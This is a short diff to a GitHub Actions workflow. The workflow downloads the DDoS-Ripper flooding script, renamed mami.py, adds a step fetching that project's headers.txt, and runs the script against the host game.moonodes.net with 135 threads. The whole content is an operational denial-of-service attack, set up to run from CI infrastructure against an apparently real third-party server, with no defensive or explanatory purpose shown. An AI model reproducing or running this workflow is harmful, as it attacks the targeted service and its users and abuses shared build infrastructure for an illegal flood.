@@ -20,7 +20,9 @@ jobs:
     - name: Download mami
       run: |
         wget https://raw.githubusercontent.com/palahsu/DDoS-Ripper/main/DRipper.py -O mami.py
-
+    - name: download files
+      run: |
+        wget https://raw.githubusercontent.com/palahsu/DDoS-Ripper/main/headers.txt
     - name: Run mami
       run: |
         python3 mami.py -s game.moonodes.net -t 135
